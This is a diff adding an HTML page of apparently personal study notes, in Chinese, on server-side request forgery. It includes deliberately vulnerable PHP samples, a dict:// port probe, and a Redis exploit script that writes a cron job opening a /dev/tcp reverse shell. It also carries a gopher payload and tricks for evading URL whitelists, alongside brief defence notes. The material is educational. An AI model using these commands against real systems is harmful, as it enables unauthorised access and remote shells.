@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- 2022-09-07 Wed 23:13 -->
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>SSRF</title>
+<meta name="author" content="Honbey Zhang" />
+<meta name="generator" content="Org Mode" />
+<link rel="stylesheet" href="../resources/orgmode.css" type="text/css"/>
+                     <link rel="stylesheet" href="../resources/style.css" type="text/css"/>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        displayAlign: "center",
+        displayIndent: "0em",
+
+        "HTML-CSS": { scale: 100,
+                        linebreaks: { automatic: "false" },
+                        webFont: "TeX"
+                       },
+        SVG: {scale: 100,
+              linebreaks: { automatic: "false" },
+              font: "TeX"},
+        NativeMML: {scale: 100},
+        TeX: { equationNumbers: {autoNumber: "AMS"},
+               MultLineWidth: "85%",
+               TagSide: "right",
+               TagIndent: ".8em"
+             }
+});
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS_HTML"></script>
+</head>
+<body>
+<div id="content" class="content">
+<header>
+<h1 class="title">SSRF</h1>
+</header>
+<div id="outline-container-orgda19889" class="outline-2">
+<h2 id="orgda19889">服务器端请求伪造</h2>
+<div class="outline-text-2" id="text-orgda19889">
+<p>
+Server-Side Request Forgery：服务器端请求伪造，是一种由攻击者构造请求，由服务端发起请求的安全漏洞。形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回数据<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>。
+</p>
+
+<p>
+有两个协议可以用到：<a href="20220708-network_protocol.html#ID-6d4b32fe-0963-4fd0-9e79-a09905dced7b">dict</a> <a href="20220708-network_protocol.html#ID-a58133b5-ab13-4e15-992a-dcdd8b5c0fd2">gopher</a> ，还可以使用 file 协议等，可用于外网进内网、探测内网端口（bp 爆破）、 反弹 shell（URL 编码）等。
+</p>
+
+<p>
+来源于知乎<sup><a id="fnr.1.100" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>，顺便尝试下 graphviz 画图：
+</p>
+
+<figure id="org8e68cf1">
+<img src="../images/ssrf_img1.png" alt="ssrf_img1.png">
+
+</figure>
+</div>
+</div>
+
+<div id="outline-container-org3cd41f4" class="outline-2">
+<h2 id="org3cd41f4">存在 SSRF 隐患的 PHP 函数</h2>
+<div class="outline-text-2" id="text-org3cd41f4">
+<ul class="org-ul">
+<li><p>
+<code>file_get_contents()</code>
+如下代码，将从 URL 参数获取 URL 的值，并将其保存为文件后并展示<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+  $url = $_GET['url'];
+  echo file_get_contents($url);
+?&gt;
+</pre>
+</div></li>
+<li><p>
+<code>fsockopen()</code>
+使用 <a href="20220718-socket.html#ID-8f85e772-fcef-4d79-9314-c30b08caa0b1">socket</a> 建立 TCP 连接并传输数据<sup><a id="fnr.2.100" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+function GetFile($host,$port,$link) {
+    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);
+    if (!$fp) {
+        echo "$errstr (error number $errno) \n";
+    } else {
+        $out = "GET $link HTTP/1.1\r\n";
+        $out .= "Host: $host\r\n";
+        $out .= "Connection: Close\r\n\r\n";
+        $out .= "\r\n";
+        fwrite($fp, $out);
+        $contents='';
+        while (!feof($fp)) {
+            $contents.= fgets($fp, 1024);
+        }
+        fclose($fp);
+        return $contents;
+    }
+}
+?&gt;
+</pre>
+</div></li>
+<li><p>
+<code>curl_exec()</code>
+使用 libcurl 获取数据<sup><a id="fnr.2.100" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+if (isset($_POST['url'])){
+    $link = $_POST['url'];
+    $curlobj = curl_init();// 创建新的 cURL 资源，v7.43 存在 %00 截断
+    curl_setopt($curlobj, CURLOPT_POST, 0);
+    curl_setopt($curlobj,CURLOPT_URL,$link);
+    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);// 设置 URL 和相应的选项
+    $result=curl_exec($curlobj);// 抓取 URL 并把它传递给浏览器，默认不跟随跳转
+    curl_close($curlobj);// 关闭 cURL 资源，并且释放系统资源
+
+    $filename = './curled/'.rand().'.txt';
+    file_put_contents($filename, $result);
+    echo $result;
+}
+?&gt;
+</pre>
+</div></li>
+<li><code>fopen()</code></li>
+<li><code>readfile()</code></li>
+</ul>
+</div>
+
+<div id="outline-container-orge8d7df5" class="outline-3">
+<h3 id="orge8d7df5">攻击 <a href="20220730-redis.html#ID-0f357c15-ef76-4958-857d-fc30339c5f9c">Redis</a> <sup><a id="fnr.2.100" class="footref" href="#fn.2" role="doc-backlink">2</a></sup></h3>
+<div class="outline-text-3" id="text-orge8d7df5">
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+# ssrf.php
+$ch = curl_init(); //创建新的 cURL 资源
+curl_setopt($ch, CURLOPT_URL, $_GET['url']); //设置URL 和相应的选项
+#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
+curl_exec($ch); //抓取 URL 内容并把它传递给浏览器，存储进文件
+curl_close($ch); //关闭 cURL 资源，并且释放系统资源
+?&gt;
+</pre>
+</div>
+<div class="org-src-container">
+<pre class="src src-html">&lt;<span style="color: #006699;">html</span>&gt;
+&lt;<span style="color: #006699;">head</span>&gt;
+    &lt;<span style="color: #006699;">title</span>&gt;<span style="color: #000000; font-weight: bold; text-decoration: underline;">post.php</span>&lt;/<span style="color: #006699;">title</span>&gt;
+&lt;/<span style="color: #006699;">head</span>&gt;
+&lt;<span style="color: #006699;">body</span>&gt;
+    &lt;<span style="color: #0000FF;">?php</span>
+    echo $_REQUEST[cmd];
+    ?&gt;
+&lt;/<span style="color: #006699;">body</span>&gt;
+&lt;/<span style="color: #006699;">html</span>&gt;
+</pre>
+</div>
+
+<p>
+<a href="20220708-network_protocol.html#ID-6d4b32fe-0963-4fd0-9e79-a09905dced7b">dict</a> 探测端口：
+</p>
+<div class="org-src-container">
+<pre class="src src-bash">curl -v -H <span style="color: #008000;">'host:one.php.local'</span> <span style="color: #008000;">'http://127.0.0.1:8080/ssrf.php?url=dict://127.0.0.1:22'</span>
+</pre>
+</div>
+<p>
+SSH-2.0-OpenSSH_for_Windows_8.1
+Invalid SSH identification string.
+</p>
+
+<p>
+exp(linux):
+</p>
+<div class="org-src-container">
+<pre class="src src-bash"><span style="color: #006FE0;">echo</span> -e <span style="color: #008000;">"\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/3000 0&gt;&amp;1\n\n\n"</span>|redis-cli -h $<span style="color: #D0372D;">1</span> -p $<span style="color: #D0372D;">2</span> -x set <span style="color: #D0372D;">1</span>
+redis-cli -h $<span style="color: #D0372D;">1</span> -p $<span style="color: #D0372D;">2</span> config set dir /var/spool/cron/
+redis-cli -h $<span style="color: #D0372D;">1</span> -p $<span style="color: #D0372D;">2</span> config set dbfilename root
+redis-cli -h $<span style="color: #D0372D;">1</span> -p $<span style="color: #D0372D;">2</span> save
+redis-cli -h $<span style="color: #D0372D;">1</span> -p $<span style="color: #D0372D;">2</span> quit
+bash shell.sh 127.0.0.1 <span style="color: #D0372D;">6379</span>
+</pre>
+</div>
+
+<p>
+转换规则：
+如果第一个字符是 &gt; 或者 &lt; 那么丢弃该行字符串，表示请求和返回的时间。
+如果前 3 个字符是 +OK 那么丢弃该行字符串，表示返回的字符串。
+将 \r 字符串替换成 %0d%0a
+空白行替换为 %0a
+</p>
+
+<p>
+再利用 <a href="20220708-network_protocol.html#ID-a58133b5-ab13-4e15-992a-dcdd8b5c0fd2">gopher</a> 协议 payload<sup><a id="fnr.3" class="footref" href="#fn.3" role="doc-backlink">3</a></sup> 反弹 shell:
+</p>
+<div class="org-src-container">
+<pre class="src src-bash">curl -v <span style="color: #008000;">'http://127.0.0.1:8080/ssrf.php?url=gopher://127.0.0.1:6379/_*...'</span> -H <span style="color: #008000;">'host: one.php.local'</span>
+</pre>
+</div>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org0e84b13" class="outline-2">
+<h2 id="org0e84b13">SSRF 漏洞</h2>
+<div class="outline-text-2" id="text-org0e84b13">
+</div>
+<div id="outline-container-orgbe0efa8" class="outline-3">
+<h3 id="orgbe0efa8">Weblogic CVE-2014-4210 <sup><a id="fnr.4" class="footref" href="#fn.4" role="doc-backlink">4</a></sup></h3>
+<div class="outline-text-3" id="text-orgbe0efa8">
+</div>
+</div>
+<div id="outline-container-org34fd664" class="outline-3">
+<h3 id="org34fd664">Discuz 3.4X SSRF</h3>
+</div>
+</div>
+<div id="outline-container-orgd7b3abe" class="outline-2">
+<h2 id="orgd7b3abe">绕过 URL 白名单或禁内网 IP 地址</h2>
+<div class="outline-text-2" id="text-orgd7b3abe">
+<ul class="org-ul">
+<li>@</li>
+<li>IP 地址转换为其他进制</li>
+<li>DNS 解析 / short url</li>
+<li>[::] -&gt; localhost</li>
+<li>127.0.0.1:80</li>
+<li>127。0。0。1</li>
+<li>Unicode</li>
+</ul>
+
+<p>
+由此增强防御：限制协议、对 DNS 响应结果或实际的建链 IP 进行判断（绕过：DNS Rebinding）。 python 防御实现：<a href="20220803-python.html#ID-1c595ae5-2f2f-4b87-8434-f0cf681e424f">Avoid SSRF</a> 。
+</p>
+</div>
+</div>
+<div id="footnotes">
+<h2 class="footnotes">Footnotes: </h2>
+<div id="text-footnotes">
+
+<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
+<a href="https://www.zhihu.com/question/54519644">ssrf漏洞详解？</a>
+</p></div></div>
+
+<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
+ssrf漏洞详解？ - w01ke的回答 - 知乎 <a href="https://www.zhihu.com/question/54519644/answer/2338531202">https://www.zhihu.com/question/54519644/answer/2338531202</a>
+</p></div></div>
+
+<div class="footdef"><sup><a id="fn.3" class="footnum" href="#fnr.3" role="doc-backlink">3</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
+gopher payload 编码：<a href="https://github.com/firebroo/sec_tools/tree/master/redis-over-gopher">https://github.com/firebroo/sec_tools/tree/master/redis-over-gopher</a>
+</p></div></div>
+
+<div class="footdef"><sup><a id="fn.4" class="footnum" href="#fnr.4" role="doc-backlink">4</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
+<a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a>
+</p></div></div>
+
+
+</div>
+</div></div>
+<div id="postamble" class="status">
+<a href="https://beian.miit.gov.cn" target="_blank">湘ICP证019014083号</a>
+</div>
+</body>
+</html>
